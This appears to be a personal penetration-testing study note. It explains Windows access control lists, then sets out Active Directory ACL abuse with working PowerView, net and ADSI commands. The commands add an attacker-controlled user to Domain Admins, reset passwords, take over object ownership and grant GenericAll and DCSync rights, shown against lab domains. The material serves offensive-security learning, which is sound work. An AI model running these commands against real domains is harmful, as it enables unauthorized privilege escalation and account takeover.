## # `Access Control List (ACL)` -

==An Access Control List (ACL) is a list of permissions associated with an object (usually a file, directory, or system resource) that specifies which users or system processes are granted access to that object and what operations they can perform==.

An ACL consists of a list of Access Control Entries (ACEs), each of which contains information about a user or group, a set of permissions, and the type of access (e.g., read, write, execute) that is allowed or denied for that user or group. The ACL is typically stored as part of the metadata of the object it is associated with.

There are two main types of ACLs :

-  <mark style="background: #3D7EFFA6;">Discretionary Access Control Lists (DACLs)</mark> :

1. <mark style="background: #FFB86CA6;">Purpose</mark> : DACLs are primarily used to define discretionary access control for an object. "Discretionary" means that the owner of the object or an administrator can exercise discretion in configuring the ACL to grant or deny permissions.

2. <mark style="background: #D2B3FFA6;">Components</mark> : 
	
    -  ==Access Control Entries (ACEs)== : These are the individual entries within the DACL. Each ACE specifies a user or group, a set of permissions (e.g., read, write, execute), and whether access is allowed or denied.

3. <mark style="background: #E632B3A6;">Modification Rights</mark> : Owners and administrators typically have the right to modify the DACL. This allows them to grant or revoke permissions for specific users or groups. Users who are not the owner or administrators typically can't modify the DACL.

4. <mark style="background: #07E997A6;">Example</mark> : Consider a file with a DACL. The DACL might contain ACEs that grant read access to a specific user, write access to a group, and deny access to another user. The owner of the file or an administrator can edit the DACL to modify these permissions.

- <mark style="background: #3D7EFFA6;">System Access Control Lists (SACLs)</mark> :

1. <mark style="background: #FFB86CA6;">Purpose</mark> : SACLs are used for system access control and auditing. They specify which security events related to an object should be audited, such as successful or failed access attempts.

2. <mark style="background: #D2B3FFA6;">Components</mark> :
	
    -  ==Auditing Entries (ACEs)== : Like DACLs, SACLs contain ACEs, but these ACEs specify auditing settings rather than permissions. Each ACE in the SACL indicates which actions should be audited (e.g., read, write), which users or groups to audit, and whether to audit successful or failed attempts.

3. <mark style="background: #E632B3A6;">Auditing and Logging</mark> : When SACLs are configured, the operating system logs security events based on the specified criteria. These logs can then be reviewed by administrators to monitor system security and identify security breaches or unauthorized access attempts.

4. <mark style="background: #07E997A6;">Example</mark> : An administrator might configure the SACL of a sensitive file to log all successful and failed access attempts by a particular user or group. This allows the administrator to monitor who is trying to access the file and whether they succeed or fail.

In summary, DACLs control who can access an object and what actions they can perform, while SACLs are used to audit and log security events related to that object.

## # `ACL Abuse` -


![[Pasted image 20230914005322.png]]

Some of the Active Directory object permissions and types that we as attackers are interested in :

- <mark style="background: #FFB86CA6;">GenericAll</mark> - full rights to the object (add users to a group or reset user's password)

- <mark style="background: #D2B3FFA6;">GenericWrite</mark> - update object's attributes (i.e logon script)

- <mark style="background: #E632B3A6;">WriteOwner</mark> - change object owner to attacker controlled user take over the object

- <mark style="background: #07E997A6;">WriteDACL</mark> - modify object's ACEs and give attacker full control right over the object

- <mark style="background: #FFB86CA6;">AllExtendedRights</mark> - ability to add user to a group or reset password

- <mark style="background: #D2B3FFA6;">ForceChangePassword</mark> - ability to change user's password

- <mark style="background: #E632B3A6;">Self (Self-Membership)</mark> - ability to add yourself to a group

---

#### # <mark style="background: #3D7EFFA6;">Checking for ACL</mark> -

```powershell
Import-Module PowerView.ps1
Invoke-ACLScanner –Domain enterprise.corp
```

#### # <mark style="background: #3D7EFFA6;">GenericAll on User</mark> -

Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate` :

```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

![[Pasted image 20230914165135.png]]

We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account.

We can reset user's `delegate` password without knowing the current password

#### # <mark style="background: #3D7EFFA6;">GenericAll on Group</mark> :

Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName` :

```powershell
Get-NetGroup "domain admins" -FullData
```

![[Pasted image 20230914165646.png]]

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

![[Pasted image 20230914165824.png]]

We can see that our attacking user `spotless` has `GenericAll` rights once again.

Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group :

```powershell
net group "domain admins" spotless /add /domain
```

Same could be achieved with Active Directory or PowerSploit module :

```powershell
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

#### # <mark style="background: #3D7EFFA6;">GenericAll / GenericWrite / Write on Computer</mark> :

If you have these privileges on a Computer object, you can pull `Kerberos Resource-based Constrained Delegation`.

#### # <mark style="background: #3D7EFFA6;">ForceChangePassword</mark> :

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password :

```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![[Pasted image 20230914171536.png]]

You can set new password like this :

```powershell
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

#### # <mark style="background: #3D7EFFA6;">WriteOwner on Group</mark> :

After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All` 

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![[Pasted image 20230914172325.png]]

We can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group :

```powershell
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

#### # <mark style="background: #3D7EFFA6;">WriteDACL + WriteOwner</mark> :

If you are owner of a group :

[Powershell]
```powershell
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```

![[Pasted image 20230914172955.png]]

And you have a `WriteDACL` on that AD object :

```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=test,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![[Pasted image 20230914173146.png]]

you can give yourself `GenericAll` privileges with a sprinkle of ADSI sorcery :

```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Which means you now fully control the AD object :

![[Pasted image 20230914173559.png]]

This effectively means that you can now add new users to the group.

#### # <mark style="background: #3D7EFFA6;">Granting Rights</mark> :

```powershell
Add-ObjectAcl –TargetDomain enterprise.corp –PrincipalIdentity student1 -Rights All -Verbose
```

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

